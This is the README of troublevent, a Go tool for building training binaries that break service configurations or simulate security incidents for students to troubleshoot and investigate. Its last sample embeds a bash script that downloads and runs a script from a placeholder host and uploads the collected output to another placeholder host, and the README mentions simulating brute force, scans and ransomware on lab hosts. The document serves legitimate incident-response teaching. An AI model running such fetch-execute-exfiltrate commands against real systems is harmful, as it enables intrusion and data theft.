# troublevent

Project Status: Actively Supported.

License: Troublevent © 2021 by Duane Dunston is licensed under Attribution-ShareAlike 4.0 International. To view a copy of this license, visit http://creativecommons.org/licenses/by-sa/4.0/

Troublevent is a Troublemaker and Event creator (troublevent) to run scenarios to help learn troubleshooting, security investigations, and interpreting system admin tasks. It is designed for schools, training providers, training new hires, CTFs, refreshing skills with a colleagues assistance, etc.

## What exactly does it do?

In my cybersecurity and system admin classes, I want students to learn troubleshooting and learn commands system and security admins use.  Using troublevent, a triblet (a single instance of a binary) can be created that will edit a configuration file such as "/etc/dhcp/dhcpd.conf" and then restart the service.  The 'edit' may change a setting that causes the DHCP server to not work properly or offers IP addresses not valid for the LAN.  The student has to go through troubleshooting processes to find the issue and correct it.  The binary they run is created by an instructor or anyone teaching troubleshooting.  A message is printed after the change is made with a statement explaining what they 'would' have done.  For example, in the previous scenario a message may be:

    You have just edited the DHCP configuration file and restarted the service.  Users are reporting they are not able to obtain an IP address.
    
that way it provides some context to what they should be looking for because that is likely how they will recognize problems, when the users start reporting problems.

It is recommended to keep the scenarios as realistic as possible.  This prevents having to create multiple VMs with a unique scenario.  Give them one VM and then run the triblet to create a troubleshooting or security event.

## Do I have to know programming?

No, you edit a yaml file and add the command to run or the file to edit and the search and replace keywords and a message.  The binary will be compiled and you can distirbute it to your students, upload to a webserver or as an attachment to an assignment on an LMS.  Triblets can be created for Windows, MacOS, and Linux.

## When to use troublevent?

If you are an educator teaching a system administration course, you can have the triblet edit a configuration file with a typo and restart the service and the student has to figure out the problem.

You may want users to be able to ensure they are typing the right command to give them the expected output.  You can add a command that prints out specific output and the student has to explain which command was executed.  For example, the triblet prints the output of - lsof -i -n.  The student has to respond that the command "lsof -i -n" was executed to produce the output.

Create security events that require the user to investigate.  Example, brute force a web server, or SSH server on a lab server, or generate a ransomware attack on the lab host.  Run a triblet on Kali to perform scans or other attacks and the student has to investigate the incident.  Run on Windows and call Atomic Red Team scripts to emulate adversary behaviors or test the logging and alert capbilities for an organization.

## TODO:

- Add a web server to keep track of triblets assigned.

- Randomly assign triblets for an assignment, DB backend to track users and the triblets they receive through web auth or some sort of auth.

- Create a GUI instead of editing the YAML file and build the binary.

## Setup

This program uses Golang (v 1.16+) and the Viper module.  Version 1.16+ is required to make use of the `go:embed` module which embeds the yaml file within the binary.

You will need to download Go.

Download the code for the project and cd into the directory

`git clone https://github.com/thedunston/troublevent.git`

`cd troublevent`

`go get github.com/spf13/viper`


then run:

`go mod init goViper`

`go tidy`
 

## Creating a triblet

You can create a triblet by copying the fileediting directory or run a command by copying the newcommand directory template.  It is suggested to rename it so it is descriptive.  Read the comments and example in the YAML file. The YAML file contains the actions to perform and a message to the user.  It is recommended to test the binary before building the executable.

`go run command.go`

and then after testing it build it to an executable:

`go build command.go`

It is recommended to provide a name so it is easier to know which binary it is.

`go build -o LabNameAndNumberGoesHere.exe`

When performing file edits, run the compiled binary with "undo" to restore the original configuration file.  In the example above, it would be:

`./LabNameAndNumberGoesHere undo`

# Sample Triblets:

### Edit the /etc/dhcp/dhcpd.conf file and change "netmask" to netmasks."  It is best to have the configuration change as real as possible so it simulates a real-world mistake.

`cp -rp fileedit Lab23`

`cd Lab23`

`nano replace.yaml`


     ---
      #Filename to search and replace
      theFile: "/etc/dhcp/dhcpd.conf"
      #Text to search for
      toSearch: "netmask"
      #Text to replace.  For real-world context, make it something the user is likely
      #to mistype such as "netmaks" instead of "netmask."
      #You can also leave off a semicolon or a curly brace.
      toReplaceWith: "netmasks"
      #Whether or not a service needs to be restarted
      #yes or no
      toRestart: "yes"
      #Service to restart command
      theService: "systemctl restart named"

      #Or just ask the user what command was used to generate the output
      theMsg: "You just edited the /etc/dhcp/dhcpd.conf file and restarted the service. Users are reporting they are not able to receive an IP address." 
 
save the file

`go run replace.go`

Fix any issues and then build.

`go build -o Lab23.bin`

During a bootcamp, the student reads the lab guide and unzips the respective file "Lab23.zip."  Inside is the file Lab23.bin The student executes "Lab23.bin" and sees the message 

    You just edited the /etc/dhcp/dhcpd.conf file and restarted the service. Users are reporting they are not able to receive an IP address.
    
That should queue them to check the appropriate log file to determine the error. DHCP is quite good at explaining the error and where it is located.

### Create a binary that runs ps -ef and the student has to determine the command that printed the output.

`cp -rp newcommand Question1Week8Lab`

`cd Question1Week8Lab`

`nano command.yaml`

     ---
       Cmd: "ps -ef"

Save the file and run:

`go run command.go`

Fix any issues and then build.

`go build -o Question1Week8Lab.bin`

The student downloads the file Question1Week8Lab.bin from an LMS as part of an assignment executes "Question1Week8Lab.bin" and should be able to respond that the output produced was from the command -  ps -ef

### On Windows Create a binary that runs the Get-Process cmdlet.
You can also use the pipe and where-object (where) cmdlet.  
Add single quotes instead of double quotes

`xcopy /E /I newcommand Question1Week9Lab`

`cd Question1Week9Lab`

`notepad command.yaml`

     ---
       # Invoke powershell and run the get-process command
       Cmd: "powershell get-Process "
       # A pipe can be used.
       # Cmd: powershell get-process | where { $_.ProcessName -eq 'chrome' }

Save the file and run:

`go run command.go`

Fix any issues and then build.

`go build -o Question1Week9Lab.exe`

The triblet gets posted to a web server and the student downloads it and executes 'Question1Week9Lab.exe' and should be able to respond that the cmdlet Get-Process was executed based on the output.

### Simulate an 'acker downloading a script, excuting it, and uploading the results.
Here you can test a new hires forensic skills based on what information they ask for to start the investigation and the process they perform to determine what happened.  Test their network flow analysis and host-based forensic analysis skills to determine what occurred on the host.  The triblet below writes the file *first.bash* to the filesystem, and copies the script text under *theScript* into the file, executes it and then deletes the *first.bash* file before the triblet exits.

`cp -r runscript Lab18`

`cd Lab18`

`gedit script.yaml`
     
     ---
       # Filename for the script. Temporary and will be deleted
       # just before the triblet terminates.
       theFile: "first.bash"
       # Shell to execute the script.
       # theShell: powershell.exe
       # theShell: cmd.exe
       theShell: "/usr/bin/bash"
       # For the script, indent 2 spaces under "theScript: |-2
       # In order to preserve the newlines.
       # Leave: theScript: |-2
       # It tells the viper parser to preserve newlines
       # for lines with two space indentions under the key: theScript
       # Be sure the last line of the script is: exit 0
       # so it can be deleted before the triblet terminates
       theScript: |-2
         #!/bin/bash

         ## Simulate a script collection and upload
         wget hxxp://somehost/aserq.jpg -O files.zip
         unzip files.zip
         cd files
         chmod +x collect.sh
         ./collect.sh
         gzip output.txt
         curl -F 'f=output.gz' hxxp://anotherhose/upload.php

         # Be sure to include exit 0
         # so the script will be deleted
         # by the triblet.
         exit 0
         # Or just ask the user what command was used to generate the output
         theMsg: "An IDS alerted to a host communicating with a known malicious IP. Investigate and find out what happened."

Save the file and run:

`go run script.go`

Fix any issues and then build.

`go build -o Lab18.bin`

You have a new incident response hire and assessing their skill level to determine the training and mentoring they need.  On a VM, the new hire downloads Lab18.bin, excutes it, and then sees the message:

        An IDS alerted to a host communicating with a known malicious IP. Investigate and find out what happened.
